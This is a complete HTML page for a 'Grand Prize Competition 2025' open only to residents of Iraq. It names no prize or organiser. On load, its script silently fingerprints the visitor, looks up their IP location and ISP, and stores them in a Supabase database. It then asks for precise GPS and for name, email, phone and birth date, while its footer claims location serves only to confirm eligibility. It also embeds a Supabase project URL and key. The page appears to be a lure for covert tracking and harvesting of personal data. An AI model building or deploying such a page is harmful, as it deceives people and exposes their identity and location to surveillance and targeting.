<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Grand Prize Competition 2025</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg:           #07090F;
      --bg-card:      #0E1018;
      --bg-input:     #080A10;
      --gold:         #C8922A;
      --gold-light:   #E5B85A;
      --gold-dim:     rgba(200,146,42,0.15);
      --cream:        #F0DEB4;
      --text:         #DDD4C0;
      --muted:        #7A7260;
      --border:       #1A1D28;
      --border-hover: #2A2F3F;
      --error:        #E05555;
      --success:      #4DAF80;
    }

    html, body {
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      font-family: 'DM Sans', sans-serif;
    }

    /* ── Background atmosphere ── */
    body::before {
      content: '';
      position: fixed; inset: 0; pointer-events: none; z-index: 0;
      background:
        radial-gradient(ellipse 60% 40% at 15% 25%, rgba(200,146,42,0.05) 0%, transparent 70%),
        radial-gradient(ellipse 50% 50% at 85% 75%, rgba(200,146,42,0.03) 0%, transparent 60%);
    }

    /* ── Screens ── */
    .screen {
      display: none;
      position: relative; z-index: 1;
      min-height: 100vh;
      padding: 36px 20px 60px;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      animation: fadeIn 0.4s ease;
    }
    .screen.active { display: flex; }
    @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }

    /* ── Loading ── */
    #screen-loading {
      position: fixed; inset: 0; z-index: 200;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      background: var(--bg);
      transition: opacity 0.5s ease;
    }
    .loader-ring {
      width: 48px; height: 48px;
      border-radius: 50%;
      border: 2px solid var(--border);
      border-top-color: var(--gold);
      animation: spin 0.75s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-text {
      margin-top: 18px;
      font-size: 13px;
      color: var(--muted);
      letter-spacing: 0.08em;
    }

    /* ── Brand header ── */
    .brand {
      text-align: center;
      margin-bottom: 36px;
    }
    .brand-trophy {
      font-size: 52px;
      display: block;
      margin-bottom: 14px;
      filter: drop-shadow(0 0 20px rgba(200,146,42,0.35));
    }
    .brand-title {
      font-family: 'Cormorant Garamond', serif;
      font-size: clamp(30px, 7vw, 50px);
      font-weight: 700;
      color: var(--cream);
      line-height: 1.05;
      letter-spacing: -0.01em;
    }
    .brand-sub {
      display: inline-block;
      margin-top: 10px;
      font-size: 11px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--gold);
    }

    /* ── Card ── */
    .card {
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 40px 36px;
      width: 100%;
      max-width: 460px;
    }
    @media (max-width: 480px) {
      .card { padding: 28px 20px; border-radius: 14px; }
    }

    .card-title {
      font-family: 'Cormorant Garamond', serif;
      font-size: 24px;
      font-weight: 600;
      color: var(--cream);
      margin-bottom: 8px;
    }
    .card-body {
      font-size: 14px;
      color: var(--muted);
      line-height: 1.75;
      margin-bottom: 28px;
    }

    /* ── GPS icon circle ── */
    .icon-circle {
      width: 68px; height: 68px;
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 30px;
      margin: 0 auto 22px;
    }
    .icon-circle.gold  { background: var(--gold-dim); border: 1px solid rgba(200,146,42,0.3); }
    .icon-circle.green { background: rgba(77,175,128,0.12); border: 1px solid rgba(77,175,128,0.3); }
    .icon-circle.red   { background: rgba(224,85,85,0.12); border: 1px solid rgba(224,85,85,0.3); }

    /* ── Buttons ── */
    .btn {
      display: flex; align-items: center; justify-content: center; gap: 8px;
      width: 100%; padding: 14px 20px;
      border: none; border-radius: 11px; cursor: pointer;
      font-family: 'DM Sans', sans-serif; font-size: 15px; font-weight: 500;
      transition: all 0.2s ease;
      text-decoration: none;
    }
    .btn-gold {
      background: linear-gradient(135deg, #C8922A 0%, #9E6E18 100%);
      color: #fff;
      box-shadow: 0 4px 20px rgba(200,146,42,0.25);
    }
    .btn-gold:hover:not(:disabled) { filter: brightness(1.12); transform: translateY(-1px); box-shadow: 0 6px 24px rgba(200,146,42,0.35); }
    .btn-gold:disabled { opacity: 0.45; cursor: not-allowed; transform: none !important; }

    /* ── Form ── */
    .form-row { margin-bottom: 18px; }
    .form-row + .form-row { }
    label {
      display: block;
      font-size: 11px; font-weight: 500;
      letter-spacing: 0.12em; text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 7px;
    }
    input[type=text], input[type=email], input[type=tel], input[type=date] {
      width: 100%;
      background: var(--bg-input);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 13px 15px;
      font-family: 'DM Sans', sans-serif;
      font-size: 15px;
      color: var(--text);
      outline: none;
      transition: border-color 0.2s;
      -webkit-appearance: none;
    }
    input:focus { border-color: var(--gold); }
    input.err   { border-color: var(--error); }
    input::placeholder { color: #2E3248; }
    .field-err { font-size: 12px; color: var(--error); margin-top: 5px; min-height: 16px; }

    /* ── Divider ── */
    hr { border: none; border-top: 1px solid var(--border); margin: 22px 0; }

    /* ── Alert boxes ── */
    .alert {
      padding: 12px 15px; border-radius: 10px;
      font-size: 13px; line-height: 1.6;
      margin-bottom: 18px;
    }
    .alert-err  { background: rgba(224,85,85,0.1);  border:1px solid rgba(224,85,85,0.3);  color: #FF9090; }
    .alert-warn { background: rgba(245,158,11,0.1); border:1px solid rgba(245,158,11,0.3); color: #FBBF24; }
    .alert-ok   { background: rgba(77,175,128,0.1); border:1px solid rgba(77,175,128,0.3); color: #6EE0AA; }

    /* ── Ornament ── */
    .orn {
      display: flex; align-items: center; gap: 10px;
      color: var(--gold); opacity: 0.3; margin: 20px 0;
    }
    .orn span { flex:1; height:1px; background: currentColor; }

    /* ── Step dots ── */
    .steps {
      display: flex; justify-content: center; gap: 7px;
      margin-bottom: 28px;
    }
    .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--border); }
    .dot.on   { background: var(--gold); }
    .dot.done { background: var(--success); }

    /* ── Footer note ── */
    .foot {
      margin-top: 28px;
      font-size: 11px; color: var(--muted); text-align: center;
      line-height: 1.7; opacity: 0.7;
    }

    /* ── Ref number ── */
    .ref-box {
      display: inline-block;
      background: var(--bg);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 8px 22px;
      font-family: monospace;
      font-size: 14px;
      letter-spacing: 0.15em;
      color: var(--gold);
      margin-top: 16px;
    }
  </style>
</head>
<body>

<!-- ─────────────────── LOADING ─────────────────── -->
<div id="screen-loading">
  <div class="loader-ring"></div>
  <p class="loader-text">Loading competition…</p>
</div>

<!-- ─────────────────── GPS SCREEN ─────────────────── -->
<div id="screen-gps" class="screen">
  <div class="brand">
    <span class="brand-trophy">🏆</span>
    <h1 class="brand-title">Grand Prize<br>Competition 2025</h1>
    <span class="brand-sub">Iraq Exclusive · Limited Entries</span>
  </div>

  <div class="card" style="text-align:center">
    <div class="icon-circle gold">📍</div>
    <h2 class="card-title">Location Verification Required</h2>
    <p class="card-body">
      This competition is open exclusively to residents of <strong style="color:var(--cream)">Iraq</strong>.
      We need to verify your location before you can enter.
      Please tap the button below and <strong style="color:var(--cream)">allow</strong> location access when your browser asks.
    </p>

    <div id="gps-alert"></div>

    <button class="btn btn-gold" id="btn-gps">
      <span>📍</span> Verify My Location
    </button>

    <p class="foot" style="margin-top:14px">
      Location is used only to confirm eligibility.<br>
      We do not share your data with third parties.
    </p>
  </div>

  <div class="foot">Competition closes 31 December 2025</div>
</div>

<!-- ─────────────────── NOT ELIGIBLE ─────────────────── -->
<div id="screen-blocked" class="screen">
  <div style="text-align:center; max-width:380px">
    <div class="icon-circle red" style="margin:0 auto 20px">🚫</div>
    <h2 style="font-family:'Cormorant Garamond',serif; font-size:30px; color:var(--cream); margin-bottom:12px">Not Eligible</h2>
    <p style="color:var(--muted); font-size:15px; line-height:1.8">
      Sorry, this competition is only available to residents of Iraq.
      Your current location does not qualify for entry.
    </p>
  </div>
</div>

<!-- ─────────────────── FORM SCREEN ─────────────────── -->
<div id="screen-form" class="screen">
  <div class="brand">
    <span class="brand-trophy">✨</span>
    <h1 class="brand-title">You're Eligible!</h1>
    <span class="brand-sub">Complete your entry below</span>
  </div>

  <div class="card">
    <div class="steps">
      <div class="dot done"></div>
      <div class="dot done"></div>
      <div class="dot on"></div>
    </div>

    <div id="form-alert"></div>

    <div class="form-row">
      <label for="f-name">Full Name</label>
      <input type="text"  id="f-name"  placeholder="Ahmad Mohammed Al-…" autocomplete="name" />
      <div class="field-err" id="e-name"></div>
    </div>

    <div class="form-row">
      <label for="f-email">Email Address</label>
      <input type="email" id="f-email" placeholder="your@email.com" autocomplete="email" />
      <div class="field-err" id="e-email"></div>
    </div>

    <div class="form-row">
      <label for="f-phone">Phone Number</label>
      <input type="tel"   id="f-phone" placeholder="+964 7XX XXX XXXX" autocomplete="tel" />
      <div class="field-err" id="e-phone"></div>
    </div>

    <div class="form-row">
      <label for="f-dob">Date of Birth</label>
      <input type="date"  id="f-dob" autocomplete="bday" />
      <div class="field-err" id="e-dob"></div>
    </div>

    <hr />

    <p style="font-size:12px; color:var(--muted); margin-bottom:18px; line-height:1.7">
      By entering you confirm all information is accurate and that you are
      a resident of Iraq. Providing false information will result in
      disqualification and a new winner will be selected.
    </p>

    <button class="btn btn-gold" id="btn-submit" onclick="submitForm()">
      Enter the Competition
    </button>
  </div>

  <div class="foot">All entries are confidential · One entry per person</div>
</div>

<!-- ─────────────────── SUCCESS SCREEN ─────────────────── -->
<div id="screen-success" class="screen">
  <div style="text-align:center; max-width:420px">
    <div class="icon-circle green" style="margin:0 auto 22px">✓</div>
    <h2 style="font-family:'Cormorant Garamond',serif; font-size:36px; font-weight:700; color:var(--cream); margin-bottom:12px">
      You're In!
    </h2>
    <p style="color:var(--muted); font-size:15px; line-height:1.8; margin-bottom:20px">
      Your entry has been recorded for the Grand Prize Competition 2025.
      The winner will be announced soon — good luck!
    </p>
    <div class="ref-box" id="entry-ref">Entry confirmed</div>
    <p class="foot" style="margin-top:18px">Screenshot this page and keep your reference number.</p>
  </div>
</div>

<!-- ─────────────────── SCRIPT ─────────────────── -->
<script>
// ══════════════════════════════════════════════════
//  CONFIG  ←  Replace with your Supabase credentials
// ══════════════════════════════════════════════════
const SUPABASE_URL      = 'https://jutxirqoqtmvbpvkwumf.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp1dHhpcnFvcXRtdmJwdmt3dW1mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc3MTk5OTEsImV4cCI6MjA5MzI5NTk5MX0.3gnuccG9AxrPoz3ks0gqvx3loU4eP6NYlLhlYQutymg';

// Iraq bounding box (approximate)
const IRAQ = { latMin:29.0, latMax:37.5, lngMin:38.6, lngMax:48.9 };

// ── Init ──
const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
let visitorId   = null;
let ipData      = {};
let gpsPosition = null;

// ══════════════════════════════════════════════════
//  UTILITIES
// ══════════════════════════════════════════════════
function show(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-' + id)?.classList.add('active');
}

function alert_(elId, type, msg) {
  const el = document.getElementById(elId);
  if (!el) return;
  el.innerHTML = msg ? `<div class="alert alert-${type}">${msg}</div>` : '';
}

function sessionId() {
  let s = sessionStorage.getItem('_cid');
  if (!s) { s = 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2,8); sessionStorage.setItem('_cid', s); }
  return s;
}

function fingerprint() {
  const raw = [navigator.userAgent, navigator.language, screen.width+'x'+screen.height,
    screen.colorDepth, new Date().getTimezoneOffset(),
    navigator.hardwareConcurrency||0, navigator.deviceMemory||0].join('|');
  let h = 5381;
  for (let i = 0; i < raw.length; i++) h = ((h<<5)+h)^raw.charCodeAt(i), h>>>=0;
  return h.toString(16).padStart(8,'0');
}

function parseUA(ua) {
  let browser='Unknown', bv='', os='Unknown', ov='', dt='desktop', brand='';
  if (/Edg\//.test(ua))       { browser='Edge';    bv=ua.match(/Edg\/(\d+)/)?.[1]||''; }
  else if (/OPR\//.test(ua))  { browser='Opera';   bv=ua.match(/OPR\/(\d+)/)?.[1]||''; }
  else if (/Chrome\//.test(ua)){ browser='Chrome';  bv=ua.match(/Chrome\/(\d+)/)?.[1]||''; }
  else if (/Firefox\//.test(ua)){ browser='Firefox'; bv=ua.match(/Firefox\/(\d+)/)?.[1]||''; }
  else if (/Safari\//.test(ua)){ browser='Safari';  bv=ua.match(/Version\/(\d+)/)?.[1]||''; }

  if (/Windows NT 10/.test(ua))        { os='Windows'; ov='10/11'; }
  else if (/Windows/.test(ua))         { os='Windows'; }
  else if (/iPhone/.test(ua))          { os='iOS';     ov=ua.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g,'.')||''; }
  else if (/iPad/.test(ua))            { os='iPadOS'; }
  else if (/Android/.test(ua))         { os='Android'; ov=ua.match(/Android ([\d.]+)/)?.[1]||''; }
  else if (/Mac OS X/.test(ua))        { os='macOS';   ov=ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g,'.')||''; }
  else if (/Linux/.test(ua))           { os='Linux'; }

  if (/iPhone|Android.*Mobile|Windows Phone/.test(ua)) dt='mobile';
  else if (/iPad|Android(?!.*Mobile)/.test(ua))        dt='tablet';

  if (/iPhone|iPad/.test(ua)) brand='Apple';
  else if (/Samsung/.test(ua)) brand='Samsung';
  else if (/Huawei/.test(ua))  brand='Huawei';
  else if (/Xiaomi|MIUI/.test(ua)) brand='Xiaomi';
  else if (/Oppo/.test(ua))    brand='Oppo';

  return { browser, bv, os, ov, dt, brand };
}

function isIraq(lat, lng) {
  return lat >= IRAQ.latMin && lat <= IRAQ.latMax && lng >= IRAQ.lngMin && lng <= IRAQ.lngMax;
}

// ══════════════════════════════════════════════════
//  VISITOR TRACKING
// ══════════════════════════════════════════════════
async function trackVisitor() {
  try {
    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
    ipData = await r.json();
  } catch { ipData = {}; }

  const ua = navigator.userAgent;
  const { browser, bv, os, ov, dt, brand } = parseUA(ua);

  const row = {
    session_id:      sessionId(),
    fingerprint:     fingerprint(),
    ip_address:      ipData.ip       || null,
    ip_country:      ipData.country_name || null,
    ip_country_code: ipData.country_code || null,
    ip_region:       ipData.region   || null,
    ip_city:         ipData.city     || null,
    ip_isp:          ipData.org      || null,
    ip_lat:          ipData.latitude || null,
    ip_lng:          ipData.longitude|| null,
    ip_timezone:     ipData.timezone || null,
    user_agent:      ua,
    browser:         browser,
    browser_version: bv,
    os:              os,
    os_version:      ov,
    device_type:     dt,
    device_brand:    brand,
    screen_width:    screen.width,
    screen_height:   screen.height,
    language:        navigator.language,
    languages:       navigator.languages?.join(', ') || null,
    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    cpu_cores:       navigator.hardwareConcurrency || null,
    device_memory:   navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null,
    platform:        navigator.platform || null,
    touch_points:    navigator.maxTouchPoints || 0,
    referrer:        document.referrer || null,
    gps_status:      'pending',
    is_eligible:     false,
  };

  try {
    const { data } = await sb.from('visitors').insert(row).select('id').single();
    if (data) visitorId = data.id;
  } catch (e) { /* non-fatal */ }
}

async function updateGPS(status, lat, lng, acc) {
  if (!visitorId) return;
  const eligible = status === 'granted' && isIraq(lat, lng);
  try {
    await sb.from('visitors').update({
      gps_status: status,
      gps_lat: lat ?? null,
      gps_lng: lng ?? null,
      gps_accuracy: acc ?? null,
      is_eligible: eligible,
      eligibility_reason: eligible ? 'GPS confirmed Iraq'
        : status === 'denied' ? 'GPS permission denied'
        : 'GPS location outside Iraq',
    }).eq('id', visitorId);
  } catch { /* non-fatal */ }
}

// ══════════════════════════════════════════════════
//  GPS FLOW
// ══════════════════════════════════════════════════
document.getElementById('btn-gps').addEventListener('click', async () => {
  const btn = document.getElementById('btn-gps');
  btn.disabled = true;
  btn.textContent = 'Waiting for permission…';
  alert_('gps-alert', '', '');

  if (!navigator.geolocation) {
    alert_('gps-alert', 'err', 'Geolocation is not supported by your browser.');
    btn.disabled = false; btn.innerHTML = '<span>📍</span> Verify My Location';
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
      gpsPosition = { lat, lng, acc };
      await updateGPS('granted', lat, lng, acc);
      isIraq(lat, lng) ? show('form') : show('blocked');
    },
    async err => {
      await updateGPS('denied', null, null, null);
      let msg = '⚠️ Location access was denied. GPS verification is required to enter.';
      if (err.code === 2) msg = '⚠️ Location unavailable. Please enable GPS on your device.';
      if (err.code === 3) msg = '⚠️ Request timed out. Please try again.';
      alert_('gps-alert', 'err', msg);
      btn.disabled = false; btn.innerHTML = '<span>📍</span> Try Again';
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
});

// ══════════════════════════════════════════════════
//  FORM SUBMISSION
// ══════════════════════════════════════════════════
async function submitForm() {
  const btn = document.getElementById('btn-submit');

  // Clear previous errors
  ['name','email','phone','dob'].forEach(f => {
    document.getElementById('e-'+f).textContent = '';
    document.getElementById('f-'+f).classList.remove('err');
  });
  alert_('form-alert','','');

  const name  = document.getElementById('f-name').value.trim();
  const email = document.getElementById('f-email').value.trim();
  const phone = document.getElementById('f-phone').value.trim();
  const dob   = document.getElementById('f-dob').value;

  let ok = true;
  function fieldErr(f, msg) {
    document.getElementById('e-'+f).textContent = msg;
    document.getElementById('f-'+f).classList.add('err');
    ok = false;
  }

  if (name.length < 3)
    fieldErr('name', 'Please enter your full name.');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    fieldErr('email', 'Please enter a valid email address.');
  if (phone.replace(/\D/g,'').length < 7)
    fieldErr('phone', 'Please enter a valid phone number.');
  if (!dob)
    fieldErr('dob', 'Please enter your date of birth.');
  else if ((Date.now() - new Date(dob)) / 31557600000 < 18)
    fieldErr('dob', 'You must be at least 18 years old to enter.');

  if (!ok) return;

  btn.disabled = true;
  btn.textContent = 'Submitting…';

  // Duplicate check
  try {
    const { data: dup } = await sb.from('contestants')
      .select('id').or(`email.eq.${email},phone.eq.${phone}`).limit(1);
    if (dup?.length) {
      alert_('form-alert','warn','⚠️ This email or phone number has already been used to enter. Only one entry per person is allowed.');
      btn.disabled = false; btn.textContent = 'Enter the Competition';
      return;
    }
  } catch { /* continue */ }

  const { browser, bv, os, ov, dt } = parseUA(navigator.userAgent);

  try {
    const { data, error } = await sb.from('contestants').insert({
      visitor_id:     visitorId,
      full_name:      name,
      email:          email,
      phone:          phone,
      date_of_birth:  dob,
      ip_address:     ipData.ip         || null,
      ip_country:     ipData.country_name || null,
      ip_city:        ipData.city       || null,
      ip_isp:         ipData.org        || null,
      gps_lat:        gpsPosition?.lat  || null,
      gps_lng:        gpsPosition?.lng  || null,
      device_type:    dt,
      browser:        browser + (bv ? ' ' + bv : ''),
      os:             os + (ov ? ' ' + ov : ''),
      fingerprint:    fingerprint(),
      is_eligible:    true,
    }).select('id').single();

    if (error) throw error;

    if (visitorId)
      await sb.from('visitors').update({ has_registered: true }).eq('id', visitorId);

    document.getElementById('entry-ref').textContent =
      'REF: ' + (data.id?.slice(0,8).toUpperCase() || 'CONFIRMED');
    show('success');

  } catch (e) {
    const msg = e?.code === '23505'
      ? '⚠️ This email or phone number has already been used to enter.'
      : '❌ Something went wrong. Please try again.';
    alert_('form-alert', 'err', msg);
    btn.disabled = false;
    btn.textContent = 'Enter the Competition';
  }
}

// ══════════════════════════════════════════════════
//  BOOTSTRAP
// ══════════════════════════════════════════════════
(async () => {
  await trackVisitor();
  const loader = document.getElementById('screen-loading');
  loader.style.opacity = '0';
  setTimeout(() => { loader.style.display='none'; show('gps'); }, 500);
})();
</script>
</body>
</html>
